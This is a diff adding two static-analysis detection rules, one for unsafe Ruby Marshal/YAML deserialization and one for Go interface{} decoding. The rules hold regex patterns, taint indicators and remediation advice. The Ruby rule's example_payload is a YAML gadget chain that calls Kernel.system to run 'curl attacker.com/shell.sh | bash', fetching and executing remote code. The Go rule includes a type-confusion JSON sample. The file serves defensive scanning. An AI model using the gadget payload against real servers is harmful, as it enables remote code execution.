@@ -1,0 +1,328 @@
+rules:
+- rule_id: DESER-RUBY-001
+  title: Unsafe Ruby Marshal or YAML Deserialization
+  description: 'Detects Marshal.load() or YAML.load() with untrusted input in Ruby, enabling arbitrary object instantiation
+    and remote code execution through deserialization gadget chains.
+
+    '
+  language: ruby
+  category: deserialization
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - marshal
+  - yaml-load
+  - rce
+  - ruby
+  - rails
+  - psych
+  patterns:
+  - type: regex
+    pattern: Marshal\.(?:load|restore)\s*\(\s*(?:request|params|data|body|input|payload)\b
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:request|params|data|body|input|payload)\b
+  - type: regex
+    pattern: Marshal\.load\s*\(\s*Base64\.decode64\s*\(
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:File\.read|open|IO\.read)\s*\(\s*(?:params|input)\b
+  - type: regex
+    pattern: Marshal\.load\s*\(\s*(?:Redis|Memcached|cache)\b
+  - type: regex
+    pattern: YAML\.load\s*\(\s*(?:URI\.open|Net::HTTP|open-uri)\b
+  - type: regex
+    pattern: Marshal\.(?:load|restore)\s*\(\s*(?:socket|conn|tcp|udp)\b
+  - type: regex
+    pattern: Psych\.(?:load|unsafe_load)\s*\(\s*(?:request|params|data|body|input)\b
+  - type: regex
+    pattern: Oj\.load\s*\(\s*(?:request|params|data|body|input)\b[^)]*mode:\s*:object
+  - type: regex
+    pattern: ERB\.new\s*\(\s*(?:params|request|data|input)\b
+  anti_patterns:
+  - YAML.safe_load
+  - Psych.safe_load
+  - permitted_classes
+  - permitted_symbols
+  - JSON.parse
+  - 'Oj.load(data, mode: :strict)'
+  - Oj.safe_load
+  - Marshal.dump(trusted
+  - '# frozen_string_literal: true'
+  - 'symbolize_names: false'
+  context_awareness:
+    surrounding_context_patterns:
+    - def create
+    - def update
+    - def index
+    - params[
+    - before_action
+    - class ApplicationController
+    - Sinatra
+    - post '/
+    - get '/
+    - Rails.application
+    - config.middleware
+    - ActiveJob
+    taint_source_indicators:
+    - params[
+    - request.body
+    - request.raw_post
+    - request.env['rack.input']
+    - cookies[
+    - session[
+    - URI.open(
+    - Net::HTTP.get(
+    - Redis.current.get(
+    - File.read(params[
+    - Rack::Request.new(env)
+    taint_sink_indicators:
+    - Marshal.load
+    - Marshal.restore
+    - YAML.load
+    - YAML.unsafe_load
+    - Psych.load
+    - Psych.unsafe_load
+    - 'Oj.load(data, mode: :object)'
+    - ERB.new
+    sanitization_patterns:
+    - YAML.safe_load
+    - Psych.safe_load
+    - JSON.parse
+    - permitted_classes
+    - permitted_symbols
+    - ActiveSupport::JSON.decode
+    - Oj.safe_load
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + rails_context) * (1 - safe_load_presence)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker targets a Ruby on Rails application endpoint that uses YAML.load() to parse user-submitted
+      configuration data. They craft a YAML payload with embedded Ruby object tags that leverage the universal RCE deserialization
+      gadget chain (e.g., Gem::Installer or ERB template injection) to execute system commands on the server.
+
+      '
+    example_payload: "--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\n\
+      requirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n\
+      \      read: 0\n      header: \"abc\"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n      socket: &1 !ruby/object:Gem::RequestSet\n\
+      \        sets: !ruby/object:Net::WriteAdapter\n          socket: !ruby/module 'Kernel'\n          method_id: :system\n\
+      \        git_set: \"curl attacker.com/shell.sh | bash\"\n      method_id: :resolve\n"
+    attacker_objective: 'Achieve remote code execution on the Ruby application server by exploiting Marshal.load() or YAML.load()
+      deserialization with Ruby-specific gadget chains available in standard library classes.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.93
+    context_match: 0.9
+    proximity_to_user_input: 0.89
+    sanitization_absence: 0.94
+  impact: 'Ruby Marshal.load and YAML.load can instantiate arbitrary objects,
+
+    enabling RCE through deserialization gadget chains. Rails applications
+
+    are particularly at risk due to the rich class hierarchy available for
+
+    gadget chain construction. Historical CVEs (CVE-2013-0156) demonstrate
+
+    the severity of this class of vulnerability in Rails.
+
+    '
+  remediation: "- Use YAML.safe_load instead of YAML.load\n- Use JSON.parse for data exchange\n- Never deserialize Marshal\
+    \ data from untrusted sources\n- If YAML.load is needed, use permitted_classes and permitted_symbols\n- Framework-specific\
+    \ guidance:\n  - Ruby on Rails: Ensure config.active_support.use_yaml_unsafe_load\n    is set to false (default in Rails\
+    \ 7+). Use ActiveSupport::JSON\n    for serialization. Configure Active Record serialized attributes\n    with coder:\
+    \ JSON instead of default YAML.\n  - Rails Sessions: Use cookie_store with encrypted cookies (the\n    default in Rails\
+    \ 5.2+). Never use Marshal-based session stores\n    with untrusted data. Set config.action_dispatch.cookies_serializer\n\
+    \    to :json.\n  - Sidekiq: Use JSON serialization for job arguments. Set\n    Sidekiq.strict_args! to enforce JSON-compatible\
+    \ arguments.\n  - Rails API: Use ActionController::API mode with JSON rendering.\n    Reject requests with Content-Type:\
+    \ application/x-yaml.\n  - Sinatra: Use JSON.parse for request body parsing. Never use\n    YAML.load on user input in\
+    \ route handlers.\n  - General Ruby: Use Oj gem with mode: :strict for fast, safe JSON\n    parsing. Use Psych.safe_load\
+    \ with explicit permitted_classes\n    when YAML is required.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://blog.rubygems.org/2013/01/31/data-verification.html
+  - https://www.elttam.com/blog/ruby-deserialization/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DESER-PY-001
+    - DESER-PY-002
+    - DESER-JAVA-001
+    - INJ-RUBY-001
+  detection_layer: 1
+- rule_id: DESER-GO-001
+  title: Unsafe Go gob or JSON Deserialization with Interface Types
+  description: 'Detects Go JSON or gob deserialization into interface{} types with user-controlled input, potentially enabling
+    type confusion, data integrity violations, and logic bypasses.
+
+    '
+  language: go
+  category: deserialization
+  severity: Medium
+  confidence: 0.78
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - gob-deserialization
+  - type-confusion
+  - interface-types
+  - go
+  - json-unmarshal
+  patterns:
+  - type: regex
+    pattern: gob\.NewDecoder\s*\(\s*(?:r\.Body|request|conn|net\.Conn|stream)\b
+  - type: regex
+    pattern: json\.NewDecoder\s*\(\s*r\.Body\s*\)\s*\.Decode\s*\(\s*&?(?:interface\{\}|map\[string\]interface\{\})\b
+  - type: regex
+    pattern: json\.Unmarshal\s*\([^,]+,\s*&?(?:interface\{\}|map\[string\]interface\{\})\b
+  - type: regex
+    pattern: gob\.Register\s*\(
+  - type: regex
+    pattern: json\.NewDecoder\s*\(\s*r\.Body\s*\)\s*\.Decode\s*\(\s*&?(?:any)\b
+  - type: regex
+    pattern: json\.Unmarshal\s*\([^,]+,\s*&?(?:any)\b
+  - type: regex
+    pattern: gob\.NewDecoder\s*\(\s*(?:bytes\.NewReader|bytes\.NewBuffer)\s*\(\s*(?:request|data|body|input)\b
+  - type: regex
+    pattern: encoding/gob.*\.Decode\s*\(\s*&?(?:interface\{\}|any)\b
+  - type: regex
+    pattern: msgpack\.Unmarshal\s*\([^,]+,\s*&?(?:interface\{\}|any)\b
+  - type: regex
+    pattern: yaml\.Unmarshal\s*\([^,]+,\s*&?(?:interface\{\}|any|map\[string\]interface\{\})\b
+  - type: regex
+    pattern: cbor\.Unmarshal\s*\([^,]+,\s*&?(?:interface\{\}|any)\b
+  anti_patterns:
+  - struct {
+  - type.*struct
+  - Validate(
+  - validator.Struct(
+  - json.Unmarshal(data, &concreteType
+  - json.NewDecoder(r.Body).Decode(&concreteStruct
+  - binding.JSON
+  - c.ShouldBindJSON
+  - c.BindJSON
+  - echo.Bind
+  context_awareness:
+    surrounding_context_patterns:
+    - func handler(
+    - http.HandleFunc
+    - http.Handler
+    - gin.Context
+    - echo.Context
+    - fiber.Ctx
+    - chi.Router
+    - mux.Router
+    - grpc.Server
+    - net.Listener
+    - func (s *Server)
+    taint_source_indicators:
+    - r.Body
+    - http.Request
+    - c.Request().Body
+    - ctx.Body()
+    - conn.Read(
+    - bufio.NewReader(conn)
+    - ioutil.ReadAll(r.Body)
+    - io.ReadAll(r.Body)
+    - r.FormValue(
+    - r.URL.Query().Get(
+    - c.QueryParam(
+    - c.Param(
+    taint_sink_indicators:
+    - json.Unmarshal
+    - json.NewDecoder.Decode
+    - gob.NewDecoder.Decode
+    - yaml.Unmarshal
+    - msgpack.Unmarshal
+    - cbor.Unmarshal
+    - xml.Unmarshal
+    sanitization_patterns:
+    - validator.New().Struct(
+    - binding.Validator
+    - type assertion
+    - switch v := x.(type)
+    - reflect.TypeOf
+    - json.Unmarshal(data, &typedStruct)
+  severity_scoring:
+    severity_weight: 6
+    risk_score_formula_hint: severity_weight * confidence * (1 + network_exposure) * (1 - type_safety_present)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker sends a crafted JSON payload to a Go HTTP handler that deserializes the body into an interface{}
+      or map[string]interface{}. Since Go''s type system is bypassed, the attacker injects unexpected types (e.g., float64
+      where int is expected, nested objects where strings are expected) causing type confusion in downstream logic. Combined
+      with gob.Register(), an attacker can trigger deserialization of registered types over a network connection, potentially
+      causing denial of service or logic bypasses.
+
+      '
+    example_payload: '// Expected: {"role": "user", "age": 25}
+
+      // Attacker sends: {"role": {"admin": true}, "age": "not_a_number", "__proto__": {"isAdmin": true}}
+
+      // When decoded into interface{}, type assertions may panic or bypass checks
+
+      '
+    attacker_objective: 'Exploit type confusion caused by deserializing into interface{}/any types to bypass authorization
+      checks, cause panics, trigger denial of service, or manipulate application logic through unexpected type coercions.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.75
+    context_match: 0.72
+    proximity_to_user_input: 0.8
+    sanitization_absence: 0.78
+  impact: 'Deserializing into interface{} types loses type safety and can lead to
+
+    type confusion, unexpected behavior, or logic bypasses. While Go is
+
+    memory-safe and does not have the same RCE risk as Java or Python
+
+    deserialization, type confusion can still lead to authorization bypass,
+
+    data corruption, and denial of service through panics. The gob package
+
+    additionally allows registered types to be instantiated from network
+
+    input, expanding the attack surface.
+
+    '
+  remediation: "- Deserialize into concrete struct types with explicit fields\n- Use struct tags for JSON field mapping\n\
+    - Validate deserialized data with a validation library\n- Prefer JSON over gob for external data\n- Framework-specific\
+    \ guidance:\n  - Gin: Use c.ShouldBindJSON(&typedStruct) with binding tags for\n    automatic validation. Define strict\
+    \ struct types with\n    `json:\"field\" binding:\"required\"` tags. Use gin.H{} only for\n    response serialization,\
+    \ never for input deserialization.\n  - Echo: Use c.Bind(&typedStruct) with validator tags. Configure\n    echo.DefaultBinder\
+    \ with strict type mapping. Use\n    echo.Validator interface for custom validation rules.\n  - Fiber: Use c.BodyParser(&typedStruct)\
+    \ with explicit struct\n    types. Never parse into map[string]interface{} or any.\n  - Standard library: Always define\
+    \ concrete structs for\n    json.NewDecoder(r.Body).Decode(&typedStruct). Use\n    json.Decoder.DisallowUnknownFields()\
+    \ to reject unexpected\n    fields. Implement json.Unmarshaler for custom validation.\n  - gRPC: Use Protocol Buffers\
+    \ with generated Go types for\n    type-safe serialization. Never use gob for cross-service\n    communication.\n  - gob:\
+    \ Only use gob for trusted, internal communication between\n    Go services over authenticated channels. Never expose\
+    \ gob\n    decoders to untrusted network input. Avoid gob.Register()\n    with types that have side effects in their methods.\n\
+    \  - General: Use the go-playground/validator library for struct\n    validation after deserialization. Implement custom\n\
+    \    UnmarshalJSON methods for complex validation logic.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://go.dev/blog/json
+  - https://pkg.go.dev/encoding/gob#hdr-Security
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: high
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - DESER-JAVA-001
+    - DESER-PY-001
+    - INJ-GO-001
+  detection_layer: 1
